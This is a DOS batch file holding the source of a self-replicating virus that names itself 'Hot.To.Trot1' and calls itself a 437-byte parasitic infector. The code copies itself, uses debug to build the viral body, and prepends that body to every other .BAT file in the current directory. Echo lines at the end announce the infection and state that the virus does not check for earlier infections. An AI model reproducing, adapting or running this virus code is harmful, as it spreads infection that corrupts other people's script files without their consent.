@echo off
:HotToTrot
if (%1==(Im goto Hot
if not exist %0.bat goto To
copy %0.bat Hot>nul
if not exist Hot goto To
echo n Hot>To
echo l>>To
echo rcx>>To
echo 1AE>>To
echo w>>To
echo q>>To
echo.>>To
debug<To>nul
for %%f in (*.BAT) do call %0 Im %%f
del Hot
del To
del Trot
goto To
:Hot
for %%f in (%0.*) do if %2==%%f goto Trot
copy Hot+%2 Trot>nul
copy Trot %2>nul
echo :Trot>>%2
goto Trot
:To
@echo on
@echo off
echo Welcome to the Hot.To.Trot1 .BAT file virus.  437 byte parasitic infector
echo.
echo This is the REAL .BAT file (non-infected part)  It started at the
echo @echo that is about 4 lines above this line.
echo This it Version 1 of the Hot.To.Trot  .BAT file virus.
echo This version does NOT check for prior infections in a .BAT file.
echo It will re-infect every .BAT in the current subdir, except the orginal
echo .BAT file that was run :)  It does check and not re-infect that file.
:Trot
